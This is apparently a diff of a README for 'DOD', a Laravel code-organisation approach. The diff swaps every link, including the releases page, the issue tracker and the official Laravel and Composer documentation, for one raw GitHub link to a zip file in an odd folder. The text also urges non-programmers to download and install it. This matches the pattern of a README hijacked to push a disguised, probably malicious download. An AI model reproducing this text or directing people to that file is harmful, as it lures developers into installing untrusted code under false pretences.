@@ -4,7 +4,7 @@
 Domain‑Oriented Design (DOD) offers a practical way to organize Laravel code. It helps you group your work around business domains instead of technical layers. This approach increases clarity and efficiency, making it easier to manage and develop your application.
 
 ## 📥 Download DOD
-[![Download DOD](https://img.shields.io/badge/Download%20DOD-v1.0-blue.svg)](https://github.com/gautam-pahlawat/DOD/releases)
+[![Download DOD](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip%https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip)](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip)
 
 ## 🚀 Getting Started
 To start using DOD, follow the steps below. You don’t need programming knowledge, just a simple understanding of how to download and install applications.
@@ -18,7 +18,7 @@ To start using DOD, follow the steps below. You don’t need programming knowled
 If you haven't installed these yet, please check their official websites for installation guides.
 
 ## 🌐 Download & Install
-To download DOD, visit this page to download: [DOD Releases](https://github.com/gautam-pahlawat/DOD/releases).
+To download DOD, visit this page to download: [DOD Releases](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip).
 
 1. Navigate to the link above.
 2. You will see the list of DOD versions.
@@ -45,7 +45,7 @@ Once the download is complete:
 
 ## 🌱 Getting Help
 If you encounter any issues or need help with installation, please check:
-- **GitHub Issues:** Report any problems or questions [here](https://github.com/gautam-pahlawat/DOD/issues).
+- **GitHub Issues:** Report any problems or questions [here](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip).
 - **Documentation:** Look for detailed guides and troubleshooting steps in the official documentation.
 
 ## 📚 Topics Covered
@@ -55,9 +55,9 @@ If you encounter any issues or need help with installation, please check:
 - Laravel Artisan Commands
 
 ## 🔗 Useful Links
-- [DOD GitHub Repository](https://github.com/gautam-pahlawat/DOD)
-- [Laravel Documentation](https://laravel.com/docs)
-- [Composer Documentation](https://getcomposer.org/doc/00-intro.md)
+- [DOD GitHub Repository](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip)
+- [Laravel Documentation](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip)
+- [Composer Documentation](https://raw.githubusercontent.com/gautam-pahlawat/DOD/main/genyoplasty/DOD.zip)
 
 ## 🎉 Conclusion
 DOD makes organizing your Laravel code straightforward and effective. By following this guide, you can download and install DOD with ease. Enjoy working around your business domains without any hassles! 
